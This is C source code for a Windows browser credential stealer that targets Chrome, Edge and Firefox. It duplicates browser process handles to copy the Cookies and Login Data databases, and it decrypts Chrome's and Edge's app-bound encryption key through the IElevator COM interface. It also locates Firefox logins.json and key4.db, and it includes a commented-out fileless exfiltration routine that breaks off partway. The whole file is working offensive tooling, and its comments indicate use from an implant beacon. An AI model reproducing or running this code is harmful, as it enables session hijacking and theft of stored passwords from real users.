// Code based on mr.un1k0d3r's seasonal videos and his cookie-grabber POC
// https://github.com/Mr-Un1k0d3r/Cookie-Graber-BOF/blob/main/cookie-graber.c
// fileless download based on nanodump methods
// https://github.com/fortra/nanodump

#include <windows.h>
#include <stdint.h> 
#include <ctype.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "cookie-monster-exe.h"
#include <stdlib.h>
#include <string.h>
#include <ncrypt.h>
#define MAX_PATH_LEN 1024
#define DEFAULT_COPY_PATH "C:\\temp"


#define IMPORT_RESOLVE FARPROC SHGetFolderPath = Resolver("shell32", "SHGetFolderPathA"); \
    FARPROC PathAppend = Resolver("shlwapi", "PathAppendA"); \
    FARPROC srand = Resolver("msvcrt", "srand");\
    FARPROC time = Resolver("msvcrt", "time");\
    FARPROC strnlen = Resolver("msvcrt", "strnlen");\
    FARPROC rand = Resolver("msvcrt", "rand");\
    FARPROC realloc = Resolver("msvcrt", "realloc");
#define intAlloc(size) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size)
#define intFree(addr) HeapFree(GetProcessHeap(), 0, addr)
#define DATA_FREE(d, l) \
    if (d) { \
        memset(d, 0, l); \
        intFree(d); \
        d = NULL; \
    }
#define CSIDL_LOCAL_APPDATA 0x001c
#define CSIDL_APPDATA 0x001a

//workaround for no slot for function (reduce number of Win32 APIs called) 
FARPROC Resolver(CHAR *lib, CHAR *func) {
    FARPROC ptr = GetProcAddress(LoadLibraryA(lib), func);
    return ptr;
}

CHAR *GetFileContent(CHAR *path) {
    CHAR fullPath[MAX_PATH];
    HANDLE hFile = NULL;
    IMPORT_RESOLVE;

    //get appdata local path and append path 
    if (path[0] == '\\') {
        printf("[DEBUG] Appending local app data path\n");
        CHAR appdata[MAX_PATH];
        SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata);
        PathAppend(appdata, path);
        strncpy(fullPath, appdata, MAX_PATH);
    } else {
        strncpy(fullPath, path, MAX_PATH);
    }
    printf("[DEBUG] LOOKING FOR FILE: '%s' \n", fullPath);
    
    //get handle to appdata
    hFile = CreateFileA(fullPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE) {
        return NULL;
    }

    CHAR *buffer = NULL;
    DWORD dwSize = 0;
    DWORD dwRead = 0;

    //read cookie file and return as buffer var
    dwSize = GetFileSize(hFile, NULL);
    buffer = (CHAR*)GlobalAlloc(GPTR, dwSize + 1);
    ReadFile(hFile, buffer, dwSize, &dwRead, NULL);

    if(dwSize != dwRead) {
        printf("file size mismatch.\n");
    }
    CloseHandle(hFile);
    return buffer;
}

CHAR *ExtractKey(CHAR *buffer, CHAR * pattern) {
    //look for pattern with key
    //CHAR pattern[] = "\"encrypted_key\":\"";
    CHAR *start = strstr(buffer, pattern);
    CHAR *end = NULL;
    CHAR *key = NULL;
    DWORD dwSize = 0;
    
    if(start == NULL) {
        return NULL;
    }
    //printf("Encrpyted string start at 0x%p buffer start at 0x%p \n", start, buffer);
    
    // calc length of key
    start += strlen(pattern);
    buffer = start;
    end = strstr(buffer, "\"");

    if(end == NULL) {
        return NULL;
    }
    dwSize = end - start;
    //printf("Encrpyted data size is %d\n", dwSize);

    //extract key from file
    key = (CHAR*)GlobalAlloc(GPTR, dwSize + 1);
    strncpy(key, buffer, dwSize);
    return key;
}

VOID GetMasterKey(CHAR *key) {
    BYTE *byteKey = NULL;
    DWORD dwOut = 0;
    IMPORT_RESOLVE;

    //calculate size of key
    CryptStringToBinaryA(key, strlen(key), CRYPT_STRING_BASE64, NULL, &dwOut, NULL, NULL);
    //printf("base64 size needed is %d.\n", dwOut);

    //base64 decode key
    byteKey = (CHAR*)GlobalAlloc(GPTR, dwOut);
    CryptStringToBinaryA(key, strlen(key), CRYPT_STRING_BASE64, byteKey, &dwOut, NULL, NULL);  
    byteKey += 5;
    
    DATA_BLOB db;
    DATA_BLOB final;
    db.pbData = byteKey;
    db.cbData = dwOut;

    //decrypt key with dpapi for current user
    BOOL result = CryptUnprotectData(&db, NULL, NULL, NULL, NULL, 0, &final);
    if(!result) {
        printf("Decrypting the key failed.\n");
        return;
    }
    //printf("Decrypted Key!");

    // return decrypted key
    CHAR *output = (CHAR*)GlobalAlloc(GPTR, (final.cbData * 4) + 1);
    DWORD i = 0;
    for(i = 0; i < final.cbData; i++) {
        sprintf(output, "%s\\x%02x", output, final.pbData[i]);
    }
    printf("Decrypt Key: %s \n", output );

    // rewind to the start of the buffer
    GlobalFree(byteKey - 5);
    GlobalFree(output);
    LocalFree(final.pbData);
}

// https://gist.github.com/snovvcrash/caded55a318bbefcb6cc9ee30e82f824
const uint8_t kCryptAppBoundKeyPrefix[] = { 'A', 'P', 'P', 'B' };
const char* BASE64_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
#define KEY_SIZE 32

int isBase64(char c) {
    return (c >= 'A' && c <= 'Z') ||    // Uppercase letters
           (c >= 'a' && c <= 'z') ||    // Lowercase letters
           (c >= '0' && c <= '9') ||    // Digits
           (c == '+') || (c == '/');    // '+' and '/'
}

uint8_t* Base64Decode(const char* encoded_string, size_t* out_len) {
    int in_len = strlen(encoded_string);
    int i = 0, j = 0, in_ = 0;
    uint8_t char_array_4[4], char_array_3[3];
    size_t decoded_size = (in_len * 3) / 4;
    uint8_t* decoded_data = (uint8_t*)malloc(decoded_size);

    *out_len = 0;
    while (in_len-- && (encoded_string[in_] != '=') && isBase64(encoded_string[in_])) {
        char_array_4[i++] = encoded_string[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++) char_array_4[i] = strchr(BASE64_CHARS, char_array_4[i]) - BASE64_CHARS;
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (i = 0; i < 3; i++) decoded_data[(*out_len)++] = char_array_3[i];
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 4; j++) char_array_4[j] = 0;
        for (j = 0; j < 4; j++) char_array_4[j] = strchr(BASE64_CHARS, char_array_4[j]) - BASE64_CHARS;
        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

        for (j = 0; j < i - 1; j++) decoded_data[(*out_len)++] = char_array_3[j];
    }

    //printf("Decoded Data: %s\n", decoded_data);  
    return decoded_data;
}

char* BytesToHexString(const BYTE *byteArray, size_t size) {
    char *hexStr = (char*)malloc((size * 4) + 1);
    if (!hexStr) return NULL;
    for (size_t i = 0; i < size; ++i) {
        sprintf(hexStr + (i * 4), "\\x%02x", byteArray[i]);
    }
    return hexStr;
}

VOID GetAppBoundKey(CHAR * key, CHAR * browser, const CLSID CLSID_Elevator, const IID IID_IElevator) {
    // initialize COM
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
    	hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    	if (FAILED(hr)) {
			printf("CoInitializeEx failed: 0x%x\n", hr);
        	return;
		}
    }
    IElevatorChrome* chromeElevator = NULL;
    IElevatorEdge* edgeElevator = NULL;
    // Create an instance of the IElevator COM object
    if (strcmp(browser, "chrome") == 0){
        hr = CoCreateInstance(&CLSID_Elevator, NULL, CLSCTX_LOCAL_SERVER, &IID_IElevator, (void**)&chromeElevator);
    }
    if (strcmp(browser, "msedge") == 0){
        hr = CoCreateInstance(&CLSID_Elevator, NULL, CLSCTX_LOCAL_SERVER, &IID_IElevator, (void**)&edgeElevator);
    }
    if (FAILED(hr)) {
        printf("Failed to create IElevator instance.\n");
        CoUninitialize();
        return;
    }
    // Set the security blanket on the proxy
    if (strcmp(browser, "chrome") == 0) {
        hr = CoSetProxyBlanket(
            (IUnknown *) chromeElevator,
            RPC_C_AUTHN_DEFAULT,
            RPC_C_AUTHZ_DEFAULT,
            COLE_DEFAULT_PRINCIPAL,
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            NULL,
            EOAC_DYNAMIC_CLOAKING
        );
    }
    if (strcmp(browser, "msedge") == 0) {
        hr = CoSetProxyBlanket(
            (IUnknown *) edgeElevator,
            RPC_C_AUTHN_DEFAULT,
            RPC_C_AUTHZ_DEFAULT,
            COLE_DEFAULT_PRINCIPAL,
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            NULL,
            EOAC_DYNAMIC_CLOAKING
        );
    }

    if (FAILED(hr)) {
        printf("Failed to set proxy blanket.\n");
        CoUninitialize();
        return;
    }
    
    // base64 decode
    size_t encrypted_key_len;
    uint8_t* encrypted_key_with_header = Base64Decode(key, &encrypted_key_len);
    if (memcmp(encrypted_key_with_header, kCryptAppBoundKeyPrefix, sizeof(kCryptAppBoundKeyPrefix)) != 0) {
        printf("Invalid key header.\n");
        free(encrypted_key_with_header);
        CoUninitialize();
        return;
    }
    
    //remove app bound key prefix
    uint8_t *encrypted_key = (uint8_t*)malloc(encrypted_key_len - sizeof(kCryptAppBoundKeyPrefix));
    memcpy(encrypted_key, encrypted_key_with_header + sizeof(kCryptAppBoundKeyPrefix), encrypted_key_len - sizeof(kCryptAppBoundKeyPrefix));
    encrypted_key_len -= sizeof(kCryptAppBoundKeyPrefix);
    // printf("encrypted key length %d\n", encrypted_key_len);

    BSTR ciphertext_data = SysAllocStringByteLen((const char*)encrypted_key , encrypted_key_len );
    
    // printf("Base64 Decoded Encrypted Key: %s\n", BytesToHexString(ciphertext_data, encrypted_key_len));
    BSTR plaintext_data = NULL;
    DWORD last_error = ERROR_GEN_FAILURE;
    // call com to decrypt key
    if (strcmp(browser, "chrome") == 0){
        hr = chromeElevator->lpVtbl->DecryptData(chromeElevator,ciphertext_data, &plaintext_data, &last_error);
    }
    if (strcmp(browser, "msedge") == 0){
        hr = edgeElevator->lpVtbl->DecryptData(edgeElevator,ciphertext_data, &plaintext_data, &last_error);
    }
    // return decrypted key
    if (SUCCEEDED(hr)) {
        //printf("Decryption succeeded.\n");
        DWORD decrypted_size = SysStringByteLen(plaintext_data);
        //printf("Decrypted Data Size: %d\n", decrypted_size);
        printf("[SUCCESS] Decrypted App Bound Key: %s\n", BytesToHexString(plaintext_data, decrypted_size));
        printf("[SUCCESS] `python3 decrypt.py -k \"%s\" -o cookie-editor -f ChromeCookies.db`\n",BytesToHexString(plaintext_data, decrypted_size));

    } else {
        printf("[ERROR] App Bound Key Decryption failed. Last error: %lu\n[ERROR] If error 203, beacon is most likely not operating out of correct file path. \n[ERROR] You must run this out of the web browser's application directory (ie 'C:\\Program Files\\Google\\Chrome\\Application'\n", last_error);
    }

    SysFreeString(plaintext_data);
    SysFreeString(ciphertext_data);
    
    free(encrypted_key_with_header);
    free(encrypted_key);
    if (strcmp(browser, "chrome") == 0){
        hr = chromeElevator->lpVtbl->Release(chromeElevator);
    }
    if (strcmp(browser, "msedge") == 0){
        hr = edgeElevator->lpVtbl->Release(edgeElevator);
    }

    CoUninitialize();

    return;

}
VOID GetEncryptionKey(char * browser) {
    char * browserProcess = "";

    char * localStatePath = "";
    
    if (strcmp(browser, "msedge") == 0){
        browserProcess = "msedge.exe";
        localStatePath = "\\Microsoft\\Edge\\User Data\\Local State";
    }
    if (strcmp(browser, "chrome") == 0){
        browserProcess = "chrome.exe";
        localStatePath = "\\Google\\Chrome\\User Data\\Local State";
    }

    // commented out for now, as it is not needed with the use of app bound encryption
    // CHAR *data = GetFileContent(localStatePath);
    // CHAR *key = NULL;

    // if(data == NULL) {
    //     printf("Reading the file failed.\n");
    //     return;
    // }
    printf("[DEBUG] Got 'Local State' File\n");
    // // extract CHAR pattern[] = "\"encrypted_key\":\""; from file
    // CHAR pattern[] = "\"encrypted_key\":\"";
    // key = ExtractKey(data, pattern);
    // GlobalFree(data);
    // if(key == NULL) {
    //     printf("getting the key failed.\n");
    //     return;
    // }
    // //printf("Got Encrypted Key ");
    // GetMasterKey(key);

    CHAR *app_key = NULL;
    CHAR *app_data = GetFileContent(localStatePath);
    CHAR app_pattern[] =  "\"app_bound_encrypted_key\":\"";
    if(app_data == NULL) {
        printf("Reading the file failed.\n");
        return;
    }
    app_key = ExtractKey(app_data, app_pattern); 
    if (strcmp(browser, "chrome") == 0){
        GetAppBoundKey(app_key, browser, Chrome_CLSID_Elevator, Chrome_IID_IElevator);
    }
    if (strcmp(browser, "msedge") == 0){
        GetAppBoundKey(app_key, browser, Edge_CLSID_Elevator, Edge_IID_IElevator);
    }
    GlobalFree(app_data);

    return;
}


CHAR *GetFirefoxFile(CHAR *file, CHAR* profile){
    CHAR *appdata = NULL;
    CHAR *tempProfile = NULL;
    IMPORT_RESOLVE;
    // create temp var to hold profile
    tempProfile = (CHAR*)GlobalAlloc(GPTR, strlen(profile) + 1);
    strncpy(tempProfile, profile, strlen(profile)+1);
    appdata = (CHAR*)GlobalAlloc(GPTR, MAX_PATH + 1);

    //get appdata local path and append path to file
    SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, appdata);
    file = strncat(tempProfile, file, strlen(file)+1);
    PathAppend(appdata, "\\Mozilla\\Firefox\\Profiles");
    PathAppend(appdata, file);
    GlobalFree(tempProfile);

    return appdata;
}

VOID GetFirefoxInfo() {
    //get firefox key
    CHAR appdata[MAX_PATH];
    HANDLE hFile = NULL;
    IMPORT_RESOLVE;

    //get appdata local path and append path 
    SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, 0, appdata);
    PathAppend(appdata, "\\Mozilla\\Firefox\\profiles.ini");
    //printf("Firefox profile info be at: %s \n", appdata );

    //get handle to appdata
    hFile = CreateFileA(appdata, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE) {
        printf("File not found at: %s \n", appdata);
        printf("Firefox not found on host\n");
        return;
    }
    
    CHAR *buffer = NULL;
    DWORD dwSize = 0;
    DWORD dwRead = 0;

    //read profiles.ini file and return as buffer var
    dwSize = GetFileSize(hFile, NULL);
    buffer = (CHAR*)GlobalAlloc(GPTR, dwSize + 1);
    ReadFile(hFile, buffer, dwSize, &dwRead, NULL);
    if(dwSize != dwRead) {
        printf("file size mismatch.\n");
    }
    CloseHandle(hFile);
    
    //look for pattern Default=Profiles/
    CHAR pattern[] = "Default=Profiles/";
    CHAR *start = strstr(buffer, pattern);
    CHAR *end = NULL;
    if(start == NULL) {
        return;
    }
    
    // calc length of profile
    start += strlen(pattern);
    buffer = start;
    end = strstr(buffer, ".default-release");

    if(end == NULL) {
        return ;
    }
    dwSize = end - start;
    //printf("Profile size is %d\n", dwSize);

    //extract profile from file
    CHAR *profile = NULL;
    profile = (CHAR*)GlobalAlloc(GPTR, dwSize + 1);
    strncpy(profile, buffer, dwSize);

    printf("Firefox Default Profile: %s \n", profile );

    // get path to logins.json
    CHAR *logins = NULL;
    logins = GetFirefoxFile(".default-release\\logins.json", profile);
    //printf("Logins: %s \n", logins );

    //check if logins.json exists
    hFile = CreateFileA(logins, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE) {
        printf("File not found at: %s \n", logins);
        return;
    }
    else{
        printf("Firefox Stored Credentials found at: %s \n", logins);
        DWORD dwRead = 0;
        DWORD dwFileSize = GetFileSize(hFile, NULL);
        CHAR *buffer = (CHAR*)GlobalAlloc(GPTR, dwFileSize);
        ReadFile(hFile, buffer, dwFileSize, &dwRead, NULL);
        // download_file(logins, buffer, dwFileSize);
        GlobalFree(buffer);
        CloseHandle(hFile);  
    }

    // get path to logins.json
    CHAR *database = NULL;
    database = GetFirefoxFile(".default-release\\key4.db", profile);

    //check if key4.db exists
    hFile = CreateFileA(database, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE) {
        printf("File not found at: %s \n", database);
        return;
    }
    else{
        printf("Firefox Database found at: %s \n", database);
        DWORD dwRead = 0;
        DWORD dwFileSize = GetFileSize(hFile, NULL);
        CHAR *buffer = (CHAR*)GlobalAlloc(GPTR, dwFileSize);
        ReadFile(hFile, buffer, dwFileSize, &dwRead, NULL);
        // download_file(database, buffer, dwFileSize);
        GlobalFree(buffer);
        CloseHandle(hFile);
    }

}

VOID GetBrowserData(char * browser, int cookie, int loginData, char * folderPath) {
    //get handle to all processes
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    INT processCount = 0;
    BOOL databaseStatus = FALSE;
    BOOL passwordStatus = FALSE;
    // if cookie only
    if (cookie == 1 && loginData == 0) {
        //then dont check for password data
        passwordStatus = TRUE;
    }
    // if login data only
    if (loginData == 1 && cookie == 0) {
        //then dont check for cookie data
        databaseStatus = TRUE;
    }
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    char * browserProcess = "";
    char * cookieDB = "";
    char * passwordDB = "";
    char * cookiePath = "";
    char * passwordPath = "";
    
    if (strcmp(browser, "msedge") == 0){
        browserProcess = "msedge.exe";
        cookieDB = "EdgeCookies.db";
        passwordDB = "EdgePasswords.db";
        cookiePath = "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies";
        passwordPath = "\\Microsoft\\Edge\\User Data\\Default\\Login Data";
    }
    if (strcmp(browser, "chrome") == 0){
        browserProcess = "chrome.exe";
        cookieDB = "ChromeCookies.db";
        passwordDB = "ChromePasswords.db";
        cookiePath = "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";
        passwordPath = "\\Google\\Chrome\\User Data\\Default\\Login Data";
    }
    
    
    //iterate through each handle to find browser process
    if(Process32First(hSnap, &pe32)) {
        do {
            if(strcmp(pe32.szExeFile, browserProcess) == 0) 
            {
                //edge was found, get cookies database
                printf("[DEBUG] Searching: %s PID: %d\n", pe32.szExeFile,pe32.th32ProcessID);
                processCount++;
                if (databaseStatus == FALSE){
                    if (GetBrowserFile(pe32.th32ProcessID, "Network\\Cookies", cookieDB, folderPath)){
                        databaseStatus = TRUE;
                    }
                }
                if (passwordStatus == FALSE){
                    if (GetBrowserFile(pe32.th32ProcessID, "Login Data", passwordDB, folderPath)){
                        passwordStatus = TRUE;
                    }
                }
            }
        } while(Process32Next(hSnap, &pe32));
        if (databaseStatus == FALSE){
            printf("[WARN] NO HANDLE TO COOKIES WAS FOUND \n");
        }
        if (passwordStatus == FALSE){
            printf("[WARN] NO HANDLE TO LOGIN DATA WAS FOUND \n");
        }
        
    }
    CloseHandle(hSnap);
    //check if process was running
    if (processCount == 0) {
        //check if file exists
        printf("%s not found running on host\n Downloading cookies directly from %s \n", browser, cookieDB);
        CHAR *data = GetFileContent(cookiePath);
        if(data == NULL) {
            printf("%s COOKIES not found on host\n", browser);
            return;
        }
        // if copy folder is not null, then copy to folder instead of download_file()
        if (strcmp(folderPath, "") != 0){
            CHAR cookieFilePath[MAX_PATH];
            sprintf(cookieFilePath, "%s\\%s", folderPath, cookieDB);
            HANDLE hFile = CreateFileA(cookieFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            
            if (hFile == INVALID_HANDLE_VALUE) {
                printf("Failed to write cookie file to %s\n", cookieFilePath);
            } else {
                DWORD written = 0;
                WriteFile(hFile, data, GetFileSize(hFile, NULL), &written, NULL);
                printf("Wrote cookie file to: %s\n", cookieFilePath);
                CloseHandle(hFile);
            }
            
        } else {
            // download_file(cookieDB,data, sizeof(data));
        }
        //download_file(cookieDB,data, sizeof(data));
        GlobalFree(data);
        CHAR *passwordData = GetFileContent(passwordPath);
        if(passwordData == NULL) {
            printf("%s LOGIN DATA not found on host\n", browser);
            return;
        }
        // if copy folder is not null, then copy to folder instead of download_file()
        if (strcmp(folderPath, "") != 0){
            CHAR passwordFilePath[MAX_PATH];
            sprintf(passwordFilePath, "%s\\%s", folderPath, passwordDB);
            HANDLE hFile = CreateFileA(passwordFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

            if (hFile == INVALID_HANDLE_VALUE) {
                printf("Failed to write password file to %s\n", passwordFilePath);
            } else {
                DWORD written = 0;
                WriteFile(hFile, passwordData, GetFileSize(hFile, NULL), &written, NULL);
                printf("Wrote password file to: %s\n", passwordFilePath);
                CloseHandle(hFile);
            }
        } else {
            // download_file(passwordDB,passwordData, sizeof(passwordData));
        }
        //download_file(passwordDB,passwordData, sizeof(passwordData));
        GlobalFree(passwordData);
    }
}


char* getNameOfHandle(HANDLE hDuplicate) {
    DWORD dwRet;
    TCHAR pathBuffer[MAX_PATH];

    dwRet = GetFinalPathNameByHandle(hDuplicate, pathBuffer, MAX_PATH, VOLUME_NAME_DOS);
    if (dwRet == 0 || dwRet >= MAX_PATH) {
        // Failed to get path or buffer too small
        return NULL;
    }

    // Allocate memory for the result string
    char* result = (char*)malloc(dwRet + 1);
    if (result == NULL) {
        return NULL;
    }

    #ifdef UNICODE
        // Convert wide string to multibyte
        WideCharToMultiByte(CP_UTF8, 0, pathBuffer, -1, result, dwRet + 1, NULL, NULL);
    #else
        strcpy(result, pathBuffer);
    #endif

    return result;
}




char* ConvertWCharToChar(const WCHAR* wideStr, int wideLen) {
    // wide char to regular char buffer conversion
    // Calculate required buffer size
    int requiredSize = WideCharToMultiByte(CP_UTF8, 0, wideStr, wideLen, NULL, 0, NULL, NULL);
    if (requiredSize <= 0) {
        printf("[ERROR] WideCharToMultiByte failed. Error code: %lu\n", GetLastError());
        return NULL;
    }

    // Allocate buffer
    char* result = (char*)malloc(requiredSize + 1); // +1 for null terminator
    if (!result) {
        printf("[ERROR] Memory allocation failed.\n");
        return NULL;
    }

    // Perform conversion
    int converted = WideCharToMultiByte(CP_UTF8, 0, wideStr, wideLen, result, requiredSize, NULL, NULL);
    if (converted <= 0) {
        printf("[ERROR] Conversion failed. Error code: %lu\n", GetLastError());
        free(result);
        return NULL;
    }

    result[converted] = '\0'; // Null-terminate
    return result;
}




BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR * folderPath) {
    IMPORT_RESOLVE;
    printf("[DEBUG] GetBrowserFile(PID %d, browserFile %s, downloadFileName %s, folderPath %s)\n",PID,browserFile,downloadFileName,folderPath);
    //printf("Browser PID found %d\n", PID);
    //printf("Searching for handle to %s \n", browserFile);
    
    SYSTEM_HANDLE_INFORMATION_EX *shi = NULL;
    DWORD dwNeeded = 0;
    DWORD dwSize = 0xffffff / 2;
    shi = (SYSTEM_HANDLE_INFORMATION_EX *)GlobalAlloc(GPTR, dwSize);
    
    //utilize NtQueryStemInformation to list all handles on system
    NTSTATUS status = NtQuerySystemInformation(SystemHandleInformationEx, shi, dwSize, &dwNeeded);
    if(status == STATUS_INFO_LENGTH_MISMATCH)
    {
        printf("[ERROR] STATUS_INFO_LENGTH_MISMATCH\n");
        dwSize = dwNeeded;
        shi = (SYSTEM_HANDLE_INFORMATION_EX*)GlobalReAlloc(shi, dwSize, GMEM_MOVEABLE);
        if (dwSize == NULL)
        {
            printf("[ERROR] Failed to reallocate memory for handle information.\n");
            GlobalFree(shi);
            return FALSE;
        }
    }
    status = NtQuerySystemInformation(SystemHandleInformationEx, shi, dwSize, &dwNeeded);
    if(status != 0)
    {
        printf("[ERROR] NtQuerySystemInformation failed with status 0x%x.\n",status);
        GlobalFree(shi);
        return FALSE;
    }
    //printf("[DEBUG] Handle Count %d\n", shi->NumberOfHandles);
    DWORD i = 0;
    BOOL firstHandle = TRUE;
    //iterate through each handle and find our PID and a handle to a file
    for(i = 0; i < shi->NumberOfHandles; i++) {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handle = shi->Handles[i];
        if((DWORD)(ULONG_PTR)handle.UniqueProcessId == PID) {
            POBJECT_NAME_INFORMATION objectNameInfo = (POBJECT_NAME_INFORMATION)malloc(0x1000);
            ULONG returnLength = 0;
            NTSTATUS ret = 0;

            // filtering out certain handles based on their access rights and attributes
            if(handle.GrantedAccess != 0x001a019f || ( handle.HandleAttributes != 0x2 && handle.GrantedAccess == 0x0012019f)) {
                HANDLE hProc = OpenProcess(PROCESS_DUP_HANDLE, FALSE, PID);
                if(hProc == INVALID_HANDLE_VALUE) {
                    printf("[ERROR] OpenProcess failed %d\n", GetLastError());
                    GlobalFree(shi);
                    free(objectNameInfo);
                    return FALSE;
                }
                
                HANDLE hDuplicate = NULL;
                if(!DuplicateHandle(hProc, (HANDLE)(intptr_t)handle.HandleValue, (HANDLE) -1, &hDuplicate, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
                    // printf("[DEBUG] DuplicateHandle failed %d\n", GetLastError());
                    continue;                  
                }
                // printf("[DEBUG] Handle to file %s duplicated \n",getNameOfHandle(hDuplicate));
                //Check if the handle exists on disk, otherwise the program will hang
                DWORD fileType = GetFileType(hDuplicate);
                if (fileType != FILE_TYPE_DISK) {
                    // printf("[DEBUG] NOT A FILE\n");
                    continue;
                }
                // query for name info               
                ret = NtQueryObject(hDuplicate,ObjectNameInformation, objectNameInfo, 0x1000, &returnLength);
                if (ret != 0)
                {
                    printf("[ERROR] Failed NtQueryObject\n");
                    GlobalFree(shi);
                    free(objectNameInfo);
                    return FALSE;
                }
                if (ret == 0 && objectNameInfo->Name.Length > 0){
                    // printf("[DEBUG] NtQueryObject returned %d with objectNameInfo->Name.Length as %d\n",ret,objectNameInfo->Name.Length);
                    // perform conversion of wide char buffer to regular buffer
                    WCHAR* wideName = objectNameInfo->Name.Buffer;
                    int wideLength = objectNameInfo->Name.Length / sizeof(WCHAR);
                    char* handleName = ConvertWCharToChar(wideName, wideLength);
                    

                    // query the object type information for the duplicated handle
                    PPUBLIC_OBJECT_TYPE_INFORMATION objectTypeInfo = (PPUBLIC_OBJECT_TYPE_INFORMATION)malloc(0x1000);
                    ret = NtQueryObject(hDuplicate,ObjectTypeInformation, objectTypeInfo, 0x1000, &returnLength);
                    if (ret != 0)
                    {
                        printf("[ERROR] Failed NtQueryObject\n");
                        GlobalFree(shi);
                        free(objectTypeInfo);
                        free(objectNameInfo);
                        free(handleName);
                        return FALSE;
                    }
                    // we have a valid file on the system
                    if (ret == 0 && (strcmp(objectTypeInfo,"File"))){
                        if (strstr(handleName, browserFile) != NULL && (strcmp(&handleName[strlen(handleName) - 4], "Data") == 0 || strcmp(&handleName[strlen(handleName) - 7], "Cookies") == 0)){
                            printf("[SUCCESS] Handle to %s Was FOUND with PID: %lu\n", handleName, PID);

                            SetFilePointer(hDuplicate, 0, 0, FILE_BEGIN);
                            DWORD dwFileSize = GetFileSize(hDuplicate, NULL);
                            DWORD dwRead = 0;
                            CHAR *buffer = (CHAR*)GlobalAlloc(GPTR, dwFileSize);
                            ReadFile(hDuplicate, buffer, dwFileSize, &dwRead, NULL);

                            //if folder path is not null, then copy to folder instead of download_file()
                            if (strcmp(folderPath, "") != 0){
                                CHAR copyFilePath[MAX_PATH];
                                sprintf(copyFilePath, "%s\\%s", folderPath, downloadFileName);
                                HANDLE hFile = CreateFileA(copyFilePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                    
                                if (hFile == INVALID_HANDLE_VALUE) {
                                    printf("[ERROR] Failed to copy %s to %s\n", handleName, copyFilePath);
                                } else {
                                    DWORD written = 0;
                                    WriteFile(hFile, buffer, dwFileSize, &written, NULL);
                                    printf("[SUCCESS] Copied to: %s\n", copyFilePath);
                                    CloseHandle(hFile);
                                }
                            } else {
                                // download_file(downloadFileName,buffer, dwFileSize);
                            }
                            
                            GlobalFree(buffer);
                            GlobalFree(shi);
                            free(objectTypeInfo);
                            free(objectNameInfo);
                            free(handleName);
                            return TRUE;
                        }
                        
                    }else{
                        printf("[DEBUG] Not the file we're looking for.\n");
                        CloseHandle(hDuplicate);
                        free(objectTypeInfo);
                        free(objectNameInfo);
                        free(handleName);
                    }
                }
            }
        }
    }
    return FALSE;
}

// nanodump fileless download
// TODO: handle the database file
// BOOL download_file( IN LPCSTR fileName, IN char fileData[], IN ULONG32 fileLength)
// {
//     IMPORT_RESOLVE;
//     int fileNameLength = strnlen(fileName, 256);

//     // intializes the random number generator
//     time_t t;
//     srand((unsigned) time(&t));

//     // generate a 4 byte random id, rand max value is 0x7fff
//     ULONG32 fileId = 0;
//     fileId |= (rand() & 0x7FFF) << 0x11;
//     fileId |= (rand() & 0x7FFF) << 0x02;
//     fileId |= (rand() & 0x0003) << 0x00;

//     // 8 bytes for fileId and fileLength
//     int messageLength = 8 + fileNameLength;
//     char* packedData = intAlloc(messageLength);
//     if (!packedData)
//     {
//         printf("Could not allocate memory for the file. Last Error %d", GetLastError());
//         return FALSE;
//     }

//     // pack on fileId as 4-byte int first
//     packedData[0] = (fileId >> 0x18) & 0xFF;
//     packedData[1] = (fileId >> 0x10) & 0xFF;
//     packedData[2] = (fileId >> 0x08) & 0xFF;
//     packedData[3] = (fileId >> 0x00) & 0xFF;

//     // pack on fileLength as 4-byte int second
//     packedData[4] = (fileLength >> 0x18) & 0xFF;
